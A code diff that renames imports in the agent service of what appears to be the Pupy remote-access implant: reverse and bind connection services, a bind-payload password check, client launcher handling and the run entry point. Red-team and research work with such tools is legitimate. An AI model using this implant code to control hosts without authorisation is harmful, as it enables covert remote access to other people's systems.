@@ -44,18 +44,18 @@ import random
 import zlib
 import time
 
-from network import conf
-from network.lib.base_launcher import LauncherError
-from network.lib.connection import PupyConnection
-from network.lib.streams.PupySocketStream import PupyChannel
-from network.lib.buffer import Buffer
-from network.lib.msgtypes import MSG_TYPES_PACK
-from network.lib.rpc.core.service import Service, ModuleNamespace
-from network.lib.compat import execute, with_metaclass, as_native_string
+from pupy.network import conf
+from pupy.network.lib.base_launcher import LauncherError
+from pupy.network.lib.connection import PupyConnection
+from pupy.network.lib.streams.PupySocketStream import PupyChannel
+from pupy.network.lib.buffer import Buffer
+from pupy.network.lib.msgtypes import MSG_TYPES_PACK
+from pupy.network.lib.rpc.core.service import Service, ModuleNamespace
+from pupy.network.lib.compat import execute, with_metaclass, as_native_string
 
 import umsgpack
 
-import pupy
+import pupy.agent as agent
 
 if sys.version_info.major > 2:
     xrange = range
@@ -86,7 +86,7 @@ class Cleanups(list):
     pass
 
 
-logger = pupy.get_logger('service')
+logger = agent.get_logger('service')
 _all = as_native_string('*')
 
 
@@ -171,7 +171,7 @@ class ReverseSlaveService(Service):
                 sys.version_info.minor
             ),
             self.exposed_namespace,
-            pupy.namespace,
+            agent.namespace,
             __import__(builtin),
             self.exposed_register_cleanup,
             self.exposed_unregister_cleanup,
@@ -198,7 +198,7 @@ class ReverseSlaveService(Service):
                 try:
                     cleanup()
                 except Exception as e:
-                    pupy.remote_error('Disconnect/cleanup: {}', e)
+                    agent.remote_error('Disconnect/cleanup: {}', e)
 
             self.exposed_cleanups = []
 
@@ -206,7 +206,7 @@ class ReverseSlaveService(Service):
             try:
                 self._conn.close()
             except Exception as e:
-                pupy.remote_error('Disconnect/close: {}', e)
+                agent.remote_error('Disconnect/close: {}', e)
 
             if os.name == 'posix':
                 try:
@@ -220,9 +220,9 @@ class ReverseSlaveService(Service):
     def exposed_exit(self):
         logger.debug('TERMINATION REQUEST')
 
-        if pupy.manager:
+        if agent.manager:
             logger.debug('Send termination event to all tasks')
-            pupy.manager.event(pupy.manager.TERMINATE)
+            agent.manager.event(agent.manager.TERMINATE)
 
         if self._conn:
             self._conn.close()
@@ -262,13 +262,13 @@ class ReverseSlaveService(Service):
                 infos.update(self.client.iteritems())
                 infos['launcher'] = self.client.launcher
 
-            debug, debug_file = pupy.get_debug()
+            debug, debug_file = agent.get_debug()
 
             infos.update({
                 'debug': debug,
                 'debug_logfile': debug_file,
-                'revision': pupy.revision,
-                'native': pupy.is_native()
+                'revision': agent.revision,
+                'native': agent.is_native()
             })
 
             return infos
@@ -337,24 +337,24 @@ class ReverseSlaveService(Service):
 class BindSlaveService(ReverseSlaveService):
 
     def on_connect(self):
-        pupy.dprint('Bind service: on_connect called')
+        agent.dprint('Bind service: on_connect called')
 
         try:
             from pupy_credentials import BIND_PAYLOADS_PASSWORD
             password = BIND_PAYLOADS_PASSWORD
 
-            pupy.dprint('Expected password: {}', repr(password))
+            agent.dprint('Expected password: {}', repr(password))
 
         except ImportError:
-            from pupylib.PupyCredentials import Credentials
+            from pupy.pupylib.PupyCredentials import Credentials
             credentials = Credentials()
             password = credentials['BIND_PAYLOADS_PASSWORD']
 
-            pupy.dprint('Expected password: {} (fallback)', repr(password))
+            agent.dprint('Expected password: {} (fallback)', repr(password))
 
         remote_password = self._conn.root.get_password()
 
-        pupy.dprint('Remote password: {}', remote_password)
+        agent.dprint('Remote password: {}', remote_password)
 
         if remote_password != password:
             self._conn.close()
@@ -420,7 +420,7 @@ class PupyClient(object):
         if self._broadcast_event:
             logger.debug(
                 'Pupy is not connected, but broadcast_event defined (%s). EventId = %08x',
-                pupy.broadcast_event, eventid)
+                agent.broadcast_event, eventid)
 
             try:
                 self._broadcast_event(eventid, *args, **kwargs)
@@ -479,21 +479,21 @@ class PupyClient(object):
     def set_info(self, key, value):
         if key in PupyClient.__slots__:
             setattr(self, key, value)
-            pupy.dprint('set client info {}: {}', key, value)
+            agent.dprint('set client info {}: {}', key, value)
             return
 
         self._custom_info[key] = value
-        pupy.dprint('set custom info {}: {}', key, value)
+        agent.dprint('set custom info {}: {}', key, value)
 
     def unset_info(self, key):
         if key in PupyClient.__slots__:
             setattr(self, key, None)
-            pupy.dprint('unset client info {}', key)
+            agent.dprint('unset client info {}', key)
             return
 
         try:
             del self._custom_info[key]
-            pupy.dprint('unset custom info {}', key)
+            agent.dprint('unset custom info {}', key)
         except KeyError:
             pass
 
@@ -566,7 +566,7 @@ class PupyClient(object):
                 pass
 
             except Exception as e:
-                pupy.remote_error('Iterate launcher: {}', e)
+                agent.remote_error('Iterate launcher: {}', e)
 
             finally:
                 logger.debug('Launcher completed')
@@ -588,7 +588,7 @@ class PupyClient(object):
                 self._iterate_launcher()
 
             except Exception as e:
-                pupy.remote_error('Launcher: {}', e)
+                agent.remote_error('Launcher: {}', e)
 
                 if type(e) == SystemExit:
                     self.terminated = True
@@ -636,9 +636,9 @@ def run(config):
 
     logger.debug('CID: %08x', config.get('cid', 0))
 
-    pupy.namespace = UpdatableModuleNamespace(_import)
+    agent.namespace = UpdatableModuleNamespace(_import)
 
-    pupy.client = PupyClient(
+    agent.client = PupyClient(
         config.get('cid', 1337),
         launcher, launcher_args,
         config.get(
@@ -651,7 +651,7 @@ def run(config):
         )
     )
 
-    pupy.client.run()
+    agent.client.run()
 
     logger.debug('Exited')
 
